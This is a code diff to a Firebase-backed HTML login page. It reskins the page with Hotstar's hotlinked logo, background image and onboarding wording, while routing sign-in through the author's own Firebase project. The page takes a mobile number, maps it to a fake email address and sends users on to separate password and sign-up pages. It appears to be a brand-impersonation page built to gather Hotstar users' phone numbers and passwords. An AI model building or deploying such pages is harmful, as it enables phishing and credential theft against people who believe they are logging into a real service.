@@ -3,20 +3,66 @@
 <head>
   <meta charset="UTF-8">
   <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://img10.hotstar.com/image/upload/f_auto,q_90,w_828/feature/onboarding/29-03-2023-in-onboarding-image.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+    }
+    .overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .box {
+      max-width: 90%;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      background-color: #1f80e0;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .subtext {
+      font-size: 12px;
+      margin-top: 20px;
+      color: #ccc;
+    }
+  </style>
 </head>
 <body>
-  <h2>Login</h2>
-  <input id="identifier" placeholder="Email or Mobile" /><br><br>
-  <button onclick="checkUser()">Next</button>
-
-  <div id="password-section" style="display:none;">
-    <input type="password" id="password" placeholder="Password"><br><br>
-    <button onclick="login()">Login</button>
+  <div class="overlay">
+    <div class="box">
+      <img src="https://img.hotstar.com/image/upload/v1656431456/web-images/logo-d-plus.svg" height="30" style="margin-bottom: 30px;">
+      <h2>Log in or sign up to continue</h2>
+      <input type="tel" id="phone" placeholder="Enter mobile number" />
+      <button onclick="checkUser()">Continue</button>
+      <p class="subtext">By proceeding you confirm that you are above 18 years of age and agree to the <a href="#" style="color:#1f80e0;">Privacy Policy</a> & <a href="#" style="color:#1f80e0;">Terms of Use</a>.</p>
+      <p id="error" style="color:red;"></p>
+    </div>
   </div>
-
-  <p id="error" style="color:red;"></p>
 
   <script>
     const firebaseConfig = {
@@ -31,30 +77,25 @@
     firebase.initializeApp(firebaseConfig);
     const auth = firebase.auth();
 
-    function checkUser() {
-      const id = document.getElementById("identifier").value.trim();
-      auth.fetchSignInMethodsForEmail(id).then(methods => {
-        if (methods.length > 0) {
-          document.getElementById("password-section").style.display = "block";
-        } else {
-          localStorage.setItem("newIdentifier", id);
-          window.location.href = "signup.html";
-        }
-      }).catch(() => {
-        document.getElementById("error").innerText = "Invalid email or mobile format";
-      });
+    function normalizePhone(phone) {
+      if (!phone.startsWith("+91")) return "+91" + phone;
+      return phone;
     }
 
-    function login() {
-      const email = document.getElementById("identifier").value.trim();
-      const password = document.getElementById("password").value;
-      auth.signInWithEmailAndPassword(email, password)
-        .then(() => {
-          window.location.href = "https://abc.xyz";
-        })
-        .catch(err => {
-          document.getElementById("error").innerText = err.message;
-        });
+    function checkUser() {
+      const phone = normalizePhone(document.getElementById("phone").value.trim());
+      const emailVersion = phone.replace("+", "") + "@mobile.com";
+
+      firebase.auth().fetchSignInMethodsForEmail(emailVersion).then(methods => {
+        localStorage.setItem("mobileEmail", emailVersion);
+        if (methods.length > 0) {
+          window.location.href = "password.html";
+        } else {
+          window.location.href = "signup.html";
+        }
+      }).catch(error => {
+        document.getElementById("error").innerText = error.message;
+      });
     }
   </script>
 </body>
